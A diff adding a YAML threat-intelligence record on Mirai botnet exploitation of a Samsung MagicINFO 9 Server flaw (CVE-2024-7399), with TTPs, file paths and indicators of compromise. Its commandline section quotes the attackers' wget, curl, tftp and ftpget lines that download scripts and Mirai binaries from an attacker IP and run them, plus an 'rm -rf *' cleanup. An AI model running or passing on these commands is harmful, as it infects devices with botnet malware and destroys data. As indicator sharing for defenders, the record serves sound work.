@@ -1,0 +1,43 @@
+summary: "This report details the exploitation of a vulnerability in Samsung MagicINFO 9 Server (CVE-2024-7399) by Mirai botnet malware. The attackers upload a JSP shell to gain remote code execution, subsequently downloading and executing Mirai for IoT device compromise."
+date: "August 16, 2024"
+author: "Johannes B. Ullrich"
+attribution: "Unknown (Mirai Botnet)"
+malware_families:
+  - Mirai
+TTPs:
+  processs:
+    - sh
+    - wget
+    - curl
+    - tftp
+    - ftpget
+  commandline:
+    - 'sh -c cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.142.122/ohshit.sh; curl -O http://176.65.142.122/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh;'
+    - 'tftp 176.65.142.122 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh'
+    - 'tftp -r ohshit2.sh -g 176.65.142.122; chmod 777 ohshit2.sh; sh ohshit2.sh'
+    - 'ftpget -v -u anonymous -p anonymous -P 21 176.65.142.122 ohshit1.sh ohshit1.sh; sh ohshit1.sh'
+    - 'rm -rf ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *'
+    - 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.142.122/hiddenbin/boatnet.x86; curl -O http://176.65.142.122/hiddenbin/boatnet.x86;cat boatnet.x86 >WTF;chmod +x *;./WTF'
+    - 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.142.122/hiddenbin/boatnet.mips; curl -O http://176.65.142.122/hiddenbin/boatnet.mips;cat boatnet.mips >WTF;chmod +x *;./WTF'
+    - 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.142.122/hiddenbin/boatnet.arc; curl -O http://176.65.142.122/hiddenbin/boatnet.arc;cat boatnet.arc >WTF;chmod +x *;./WTF'
+  registry_keys: []
+  network_connections:
+    - protocol: HTTP
+      port: 80
+      destination: "176.65.142.122"
+  file_modifications:
+    - "/tmp/ohshit.sh"
+    - "/var/run/ohshit.sh"
+    - "/mnt/ohshit.sh"
+    - "/root/ohshit.sh"
+    - "/"
+    - "/tmp/WTF"
+  persistence: []
+IOCs:
+  - IP Address: 176.65.142.122
+  - URL: "http://176.65.142.122/ohshit.sh"
+  - URL: "http://176.65.142.122/hiddenbin/boatnet.x86"
+  - URL: "http://176.65.142.122/hiddenbin/boatnet.mips"
+  - URL: "http://176.65.142.122/hiddenbin/boatnet.arc"
+  - SHA256 Hash: 0a391054e50a4808553466263c9c3b63e895be02c957dbb957da3ba96670cf34
+reference: https://isc.sans.edu/diaryarchive.html
